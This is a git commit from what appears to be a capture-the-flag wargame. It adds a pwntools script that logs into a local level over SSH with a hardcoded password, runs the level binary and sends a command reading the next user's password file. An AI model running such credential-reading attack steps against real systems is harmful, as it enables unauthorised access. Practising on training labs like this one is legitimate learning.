8918b191294a3420b3eeb9c72f4e0a262e5cc906
0xOnyx <jeremy.dosg@gmail.com>
2025-11-13 22:43:15 +0100

    FINAL BONUS 0

---
+++ bonus1/source.py
@@ -0,0 +1,77 @@
+#!/usr/bin/env python3
+from pwn import *
+import base64
+import os
+
+from pwnlib.adb import shell
+
+# Configuration
+context.arch = 'i386'  # Architecture du binaire (32-bit)
+context.log_level = 'info'  # Niveau de log (debug, info, warning, error)
+
+# Variables pour la connexion
+LOCAL = False  # Mettre à False pour l'exploitation SSH
+HOST = "localhost"  # Hôte pour SSH
+PORT = 8881  # Port pour SSH
+USER = "bonus1"  # Nom d'utilisateur SSH
+PASSWORD = "cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9"  # Mot de passe SSH
+SSH_SESSION = None
+
+
+def get_connection(custom_env=None, argv=None):
+    global SSH_SESSION
+    # Fonction helper pour fusionner les environnements
+    def merge_env(base_env, custom_env):
+        if custom_env:
+            base_env.update(custom_env)
+        return base_env
+
+    if LOCAL:
+        # En local, on utilise l'environnement actuel comme base
+        SSH_SESSION = None
+        local_env = os.environ.copy()
+        final_env = merge_env(local_env, custom_env)
+        final_argv = argv if argv is not None else ['./Resources/' + USER]
+        return process(final_argv, env=final_env)
+    else:
+        shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
+        SSH_SESSION = shell
+        # Récupérer l'environnement distant
+        remote_env = shell.run('env').recvall().decode().strip()
+        # Convertir l'output en dictionnaire
+        remote_env_dict = dict(line.split('=', 1) for line in remote_env.split('\n') if '=' in line)
+
+        # Fusionner avec nos variables personnalisées 
+        final_env = merge_env(remote_env_dict, custom_env)
+        final_argv = argv if argv is not None else ['/home/user/' + USER + '/' + USER]
+        log.info(f"Final argv: {final_argv}")
+        return shell.process(final_argv, env=final_env)
+
+
+def exploit():
+    conn = get_connection()
+ 
+
+    try:
+        if not LOCAL:
+            conn.recvuntil(b'$')
+            conn.sendline(b'cat /home/user/bonus2/.pass')
+            flag = conn.recvline()
+            print("\n=== Flag ===")
+            print(flag.decode())
+        conn.interactive()
+    
+    except EOFError:
+        print("EOFError")
+        pass
+    except Exception as e:
+        print(e)
+        pass
+    finally:
+        conn.close()
+
+   
+if __name__ == "__main__":
+    exploit()
+
+
